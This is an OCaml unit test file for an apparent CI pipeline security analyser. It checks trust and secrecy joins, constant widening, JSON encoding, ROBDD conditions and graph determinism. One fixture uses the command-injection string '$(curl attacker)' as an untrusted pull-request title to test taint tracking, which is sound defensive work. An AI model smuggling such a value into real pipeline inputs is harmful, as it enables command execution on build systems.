type test = string * (unit -> unit)

exception Failed of string

let fail format = Printf.ksprintf (fun value -> raise (Failed value)) format
let expect message condition = if not condition then fail "%s" message

let provenance origin =
  { Abstract_value.origin; span = Span.none; operation = "fixture" }

let product_domain_test () =
  let trusted =
    Abstract_value.string_constant "release" ~trust:Abstract_value.Trusted
      ~secrecy:Abstract_value.Public
      ~provenance:[ provenance "literal" ]
  and attacker =
    Abstract_value.string_constant "$(curl attacker)"
      ~trust:Abstract_value.Untrusted ~secrecy:Abstract_value.Secret
      ~provenance:[ provenance "pull_request.title" ]
  in
  let joined = Abstract_value.join trusted attacker in
  expect "untrusted must dominate a trust join"
    (joined.trust = Abstract_value.Untrusted);
  expect "secret must dominate a secrecy join"
    (joined.secrecy = Abstract_value.Secret);
  expect "both origins must survive the join" (List.length joined.provenance = 2);
  match joined.value with
  | Abstract_value.String (Abstract_value.Constants values) ->
      expect "constant set join must preserve alternatives"
        (List.length values = 2)
  | _ -> fail "expected a finite string constant set"

let bounded_domain_test () =
  let values =
    List.init 12 (fun index ->
        Abstract_value.string_constant (string_of_int index)
          ~trust:Abstract_value.Trusted ~secrecy:Abstract_value.Public
          ~provenance:[])
  in
  let joined =
    List.fold_left Abstract_value.join Abstract_value.bottom values
  in
  match joined.value with
  | Abstract_value.String Abstract_value.Top -> ()
  | _ -> fail "a growing constant set must widen to Top"

let finite_domain_boundary_test () =
  let values =
    List.init 8 (fun index ->
        Abstract_value.string_constant (string_of_int index)
          ~trust:Abstract_value.Trusted ~secrecy:Abstract_value.Public
          ~provenance:[])
  in
  let joined =
    List.fold_left Abstract_value.join Abstract_value.bottom values
  in
  match joined.value with
  | Abstract_value.String (Abstract_value.Constants constants) ->
      expect "the finite constant domain includes its eighth value"
        (List.length constants = 8)
  | _ -> fail "eight constants must remain below the widening boundary"

let boolean_json_test () =
  let value value_type value : Abstract_value.t =
    {
      value_type;
      value;
      trust = Abstract_value.Trusted;
      secrecy = Abstract_value.Public;
      provenance = [];
    }
  in
  let encode value = Abstract_value.to_json value |> Json.to_string in
  expect "abstract true must remain true in machine-readable evidence"
    (Util.contains ~needle:"\"value\":true"
       (value Abstract_value.Bool_type
          (Abstract_value.Boolean Abstract_value.True)
       |> encode));
  expect "abstract false must remain false in machine-readable evidence"
    (Util.contains ~needle:"\"value\":false"
       (value Abstract_value.Bool_type
          (Abstract_value.Boolean Abstract_value.False)
       |> encode));
  let interval : Abstract_value.interval =
    { minimum = Some 1L; maximum = Some 2L }
  in
  let number =
    value Abstract_value.Number_type (Abstract_value.Number interval) |> encode
  in
  expect "number type must retain its canonical name"
    (Util.contains ~needle:"\"type\":\"number\"" number);
  expect "number bounds must remain structured"
    (Util.contains ~needle:"\"maximum\":2" number
    && Util.contains ~needle:"\"minimum\":1" number);
  let object_ =
    value Abstract_value.Object_type (Abstract_value.Object (Some [])) |> encode
  in
  expect "object type must retain its canonical name"
    (Util.contains ~needle:"\"type\":\"object\"" object_);
  let null = value Abstract_value.Null_type Abstract_value.Null |> encode in
  expect "null type must retain its canonical name"
    (Util.contains ~needle:"\"type\":\"null\"" null)

let affix_join_test () =
  let affix prefix suffix : Abstract_value.t =
    {
      value_type = Abstract_value.String_type;
      value = Abstract_value.String (Abstract_value.Affix { prefix; suffix });
      trust = Abstract_value.Trusted;
      secrecy = Abstract_value.Public;
      provenance = [];
    }
  in
  let joined left right = (Abstract_value.join left right).value in
  (match
     joined
       (affix (Some "alpha") (Some "same-end"))
       (affix (Some "beta") (Some "same-end"))
   with
  | Abstract_value.String
      (Abstract_value.Affix { prefix = None; suffix = Some "same-end" }) -> ()
  | _ -> fail "a shared suffix must survive when prefixes diverge");
  (match
     joined
       (affix (Some "same-prefix") (Some "left-a"))
       (affix (Some "same-prefix") (Some "right-b"))
   with
  | Abstract_value.String
      (Abstract_value.Affix { prefix = Some "same-prefix"; suffix = None }) ->
      ()
  | _ -> fail "a shared prefix must survive when suffixes diverge");
  match
    joined (affix (Some "alpha") (Some "left-a"))
      (affix (Some "beta") (Some "right-b"))
  with
  | Abstract_value.String Abstract_value.Top -> ()
  | _ -> fail "fully divergent affixes must widen to Top"

let robdd_test () =
  let open Condition in
  let a = atom "authorized" and b = atom "fork" in
  let absorbed = and_ a (or_ a b) in
  expect "ROBDD reduction must prove absorption" (equal absorbed a);
  expect "a implies a or b" (implies a (or_ a b));
  expect "a and not a must be unsatisfiable"
    (not (satisfiable (and_ a (not_ a))));
  expect "unknown input evaluates to Unknown"
    (evaluate (fun _ -> None) a = Condition.Unknown);
  expect "false condition has a stable canonical string"
    (to_string false_ = "false");
  expect "an atom retains its variable in canonical strings"
    (to_string a = "authorized")

let node provider name start_byte =
  let start =
    Span.position ~byte:start_byte ~line:1 ~column:(start_byte + 1) ()
  in
  let stop =
    Span.position ~byte:(start_byte + 1) ~line:1 ~column:(start_byte + 2) ()
  in
  let span = Span.make ~file:"fixture.yml" start stop in
  Ir.make_node ~provider ~kind:Ir.Job ~name ~phase:Ir.Plan ~span ()

let deterministic_ir_test () =
  let left = node Ir.Github "build" 4 and right = node Ir.Github "deploy" 20 in
  let first =
    Ir.empty Ir.Github "fixture.yml"
    |> Ir.add_node left |> Ir.add_node right
    |> Ir.add_edge
         (Ir.make_edge ~kind:Ir.Control ~from_:left.id ~to_:right.id ())
    |> Ir.finalize
  and second =
    Ir.empty Ir.Github "fixture.yml"
    |> Ir.add_node right |> Ir.add_node left
    |> Ir.add_edge
         (Ir.make_edge ~kind:Ir.Control ~from_:left.id ~to_:right.id ())
    |> Ir.finalize
  in
  expect "stable node IDs need a readable namespace"
    (Util.starts_with ~prefix:"wv_" left.id);
  expect "graph serialization cannot depend on insertion order"
    (Json.to_string (Ir.to_json first) = Json.to_string (Ir.to_json second));
  expect "graph must validate" (Ir.validate first = [])

let phase_and_unknown_test () =
  let compile =
    Ir.make_node ~provider:Ir.Azure ~kind:Ir.Parameter ~name:"template value"
      ~phase:Ir.Compile ~span:Span.none ()
  and runtime =
    Ir.make_node ~provider:Ir.Azure ~kind:Ir.Command ~name:"runtime command"
      ~phase:Ir.Run ~span:Span.none ()
  and opaque =
    Ir.make_node ~provider:Ir.Azure ~kind:Ir.Opaque ~name:"future expression"
      ~phase:Ir.Compile ~span:Span.none
      ~unknown:(Unknown.Unsupported_syntax "each directive") ()
  in
  let graph =
    Ir.empty Ir.Azure "azure-pipelines.yml"
    |> Ir.add_node compile |> Ir.add_node runtime |> Ir.add_node opaque
    |> Ir.add_edge
         (Ir.make_edge ~kind:Ir.Data ~from_:runtime.id ~to_:compile.id ())
    |> Ir.finalize
  in
  expect "runtime data cannot flow back into compile phase"
    (List.exists
       (fun issue -> issue.Ir.code = "IR-PHASE-ORDER")
       (Ir.validate graph));
  expect "opaque reason must survive canonical JSON"
    (Util.contains ~needle:"each directive" (Json.to_string (Ir.to_json graph)))

let tests : test list =
  [
    ("product domain joins trust secrecy and provenance", product_domain_test);
    ("finite constants widen deterministically", bounded_domain_test);
    ("finite constants retain the inclusive widening boundary", finite_domain_boundary_test);
    ("abstract booleans retain their JSON truth value", boolean_json_test);
    ("abstract affix joins preserve one-sided information", affix_join_test);
    ("ROBDD canonicalizes and decides implication", robdd_test);
    ("IR identity and serialization are deterministic", deterministic_ir_test);
    ("phase availability and Unknown are explicit", phase_and_unknown_test);
  ]

let () =
  let failures = ref 0 in
  List.iter
    (fun (name, run) ->
      try
        run ();
        Printf.printf "ok - %s\n%!" name
      with
      | Failed message ->
          incr failures;
          Printf.eprintf "not ok - %s: %s\n%!" name message
      | error ->
          incr failures;
          Printf.eprintf "not ok - %s: unexpected %s\n%!" name
            (Printexc.to_string error))
    tests;
  if !failures > 0 then exit 1
